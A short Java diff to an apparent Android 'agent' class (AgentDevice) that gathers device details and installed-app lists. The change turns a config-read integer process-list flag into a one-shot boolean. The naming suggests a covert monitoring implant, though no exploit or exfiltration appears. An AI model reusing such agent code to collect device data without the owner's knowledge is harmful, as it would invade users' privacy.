@@ -46,7 +46,7 @@ public class AgentDevice extends AgentBase {
 	private static final String TAG = "AgentDevice"; //$NON-NLS-1$
 
 	/** The process list. */
-	private int processList;
+	private boolean processList;
 
 	/** The cpu usage. */
 	private float cpuUsage;
@@ -72,10 +72,8 @@ public class AgentDevice extends AgentBase {
 	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#parse(byte[])
 	 */
 	@Override
-	public boolean parse(AgentConf conf) {
-		myConf = Utils.bufferToByteBuffer(conf.getParams(), ByteOrder.LITTLE_ENDIAN);
-
-		this.processList = myConf.getInt();
+	public boolean parse(AgentConf conf) {		
+		this.processList = true;
 		return true;
 	}
 
@@ -149,7 +147,8 @@ public class AgentDevice extends AgentBase {
 			sb.append(pairs.getKey() + " : " + pairs.getValue() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
 
-		if (processList == 1) {
+		if (processList ) {
+			processList=false;
 			final ArrayList<PInfo> apps = getInstalledApps(false); /*
 																	 * false =
 																	 * no system
